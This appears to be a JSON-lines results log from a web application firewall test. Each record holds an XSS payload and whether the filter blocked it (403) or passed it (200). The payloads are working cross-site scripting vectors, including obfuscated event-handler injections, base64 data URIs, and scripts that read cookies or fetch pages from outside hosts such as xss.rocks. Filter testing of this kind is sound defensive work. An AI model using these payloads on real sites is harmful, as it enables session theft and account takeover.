+{"payload": "<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005166848990484141}
+{"payload": "<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004013974001281895}
+{"payload": "<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006678401012322865}
+{"payload": "<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004938216996379197}
+{"payload": "<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038144770078361034}
+{"payload": "<iframe src=/ onload=eval(unescape(this.name.replace(/\\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004012731005786918}
+{"payload": "<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003933698986656964}
+{"payload": "<iframe src=http://xss.rocks/scriptlet.html <", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034020980092464015}
+{"payload": "<iframe style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034906979999504983}
+{"payload": "<iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074('\\u0061') worksinIE>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033587990037631243}
+{"payload": "<iframe/onreadystatechange=alert(1)", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033746900007827207}
+{"payload": "<iframe/src \\/\\/onload = prompt(1)", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003242477003368549}
+{"payload": "<IMG DYNSRC=\\\"javascript:alert('XSS')\\\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033998319995589554}
+{"payload": "<IMG onmouseover=\"alert('xxs')\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035626449971459806}
+{"payload": "<img src ?itworksonchrome?\\/onerror = alert(1)???", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003668934994493611}
+{"payload": "<IMG SRC= onmouseover=\"alert('xxs')\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005425245006335899}
+{"payload": "<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003990388999227434}
+{"payload": "<IMG SRC=\"jav&amp;", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003957092994824052}
+{"payload": "<img src=\"javascript:alert('XSS')\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004327276998083107}
+{"payload": "<img src=`xx:xx`onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037164719979045913}
+{"payload": "<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 />", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035179869882995263}
+{"payload": "<img src=x onerror=\"&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035579539980972186}
+{"payload": "<input type=\"text\" value=``<div/onmouseover='alert(1)'>X</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005030305997934192}
+{"payload": "<input value=<><iframe/src=javascript:confirm(1)", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006678550998913124}
+{"payload": "<math><a xlink:href=\"//jsfiddle.net/t846h/\">click", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004207630001474172}
+{"payload": "<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/>?", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004108196997549385}
+{"payload": "<object data=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\">?", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003941672999644652}
+{"payload": "<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0040725080034462735}
+{"payload": "<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034269160096300766}
+{"payload": "<object data=javascript&colon;\\u0061&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005084709991933778}
+{"payload": "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.009323379999841563}
+{"payload": "<script for=document event=onreadystatechange>getElementById('safe123').click()</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004389797992189415}
+{"payload": "<script itworksinallbrowsers>/*<script* */alert(1)</script ?", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033554469991941005}
+{"payload": "<script src=\"data:text/javascript,alert(1)\"></script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034360379941063}
+{"payload": "<SCRIPT SRC=\"http:&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034568739938549697}
+{"payload": "<SCRIPT SRC=http://xss.rocks/xss.js?< B >", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003895385001669638}
+{"payload": "<script x> alert(1) </script 1=2", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032274330005748197}
+{"payload": "<script/src=\"data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\"></script a=\\u0061 & /=%2F", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003511513990815729}
+{"payload": "<SCRIPT/SRC=\"http:&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035438029881333932}
+{"payload": "<script/src=&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003378681998583488}
+{"payload": "<script/src=data&colon;text/j\\u0061v\\u0061&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005461851003929041}
+{"payload": "<SCRIPT\\s\" != \"<SCRIPT/XSS\\s';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006407235006918199}
+{"payload": "<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004795259010279551}
+{"payload": "<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003856117997202091}
+{"payload": "<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0044322250032564625}
+{"payload": "<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 />", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00413610199757386}
+{"payload": "<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003993424994405359}
+{"payload": "<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003223651001462713}
+{"payload": "<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003792304007220082}
+{"payload": "<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00393805700878147}
+{"payload": "<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037005560006946325}
+{"payload": "<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033268109982600436}
+{"payload": "<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003724442998645827}
+{"payload": "<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004193551998469047}
+{"payload": "<script>~'\\u0061' ;  \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073.  \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037500619946513325}
+{"payload": "<script>+-+-1-+-+alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003409873999771662}
+{"payload": "<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033196790027432144}
+{"payload": "<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036487250035861507}
+{"payload": "<script>alert(document.head.childNodes[3].text)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003817271994194016}
+{"payload": "<script>alert(document.head.innerHTML.substr(146,20));</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004160258002229966}
+{"payload": "<script>alert('XSS');</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034523439971962944}
+{"payload": "<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004031498989206739}
+{"payload": "<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038491849991260096}
+{"payload": "<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003370064005139284}
+{"payload": "<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003379934001713991}
+{"payload": "<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003391266000107862}
+{"payload": "<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003854663998936303}
+{"payload": "<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004949629001202993}
+{"payload": "<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0045534410019172356}
+{"payload": "'<script>window.onload=function(){document.forms[0].message.value='1';}</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035319579910719767}
+{"payload": "<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\\/script>%22)};document.body.appendChild(x);</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005012827008613385}
+{"payload": "<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%22)};document.body.appendChild(x);</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004149793006945401}
+{"payload": "<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003914120010449551}
+{"payload": "<svg contentScriptType=text/vbs><script>MsgBox+1", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032078710064524785}
+{"payload": "<svg/onload=alert(1)", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003484797998680733}
+{"payload": "<svg><script ?>alert(1)", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003239476995076984}
+{"payload": "<svg><script onlypossibleinopera:-)> alert(1)", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003404332004720345}
+{"payload": "<svg><script>//&NewLine;confirm(1);</script </svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031375600083265454}
+{"payload": "<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003542969992849976}
+{"payload": "<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\\/script%26gt;\\%26quot;%26quot;) autofocus></textarea>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004446512000868097}
+{"payload": "<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003659277004771866}
+{"payload": "<var onmouseover=\"prompt(1)\">On Mouse Over</var>?", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033182250044774264}
+{"payload": "<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003921654002624564}
+{"payload": "alert", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.010038959007943049}
+{"payload": "alert&lpar;1&rpar;", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.010069198004202917}
+{"payload": "alert(1)", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.010075358994072303}
+{"payload": "alert\\\\`1\\\\`", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.023266981996130198}
+{"payload": "alert`1`", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.015168233003350906}
+{"payload": "<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006320938002318144}
+{"payload": "http://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/test.xxe", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.0153396780078765}
+{"payload": "http://www.<script>alert(1)</script .com", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006054661003872752}
+{"payload": "https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/test.xxe", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.016009997998480685}
+{"payload": "javascript:alert%28/xss/%29", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005476229009218514}
+{"payload": "javascript:alert(1)", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005323143006535247}
+{"payload": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.015390905988169834}
+{"payload": "x”</title><img src%3dx onerror%3dalert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005680475995177403}
+{"payload": "[[", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.013715227003558539}
+{"payload": "a{b:`function(){alert(1)}()`;}", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005057487011072226}
+{"payload": "\"><style type=text/less>a{b:`function(){alert(1)}()`;}</style>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00535613700048998}
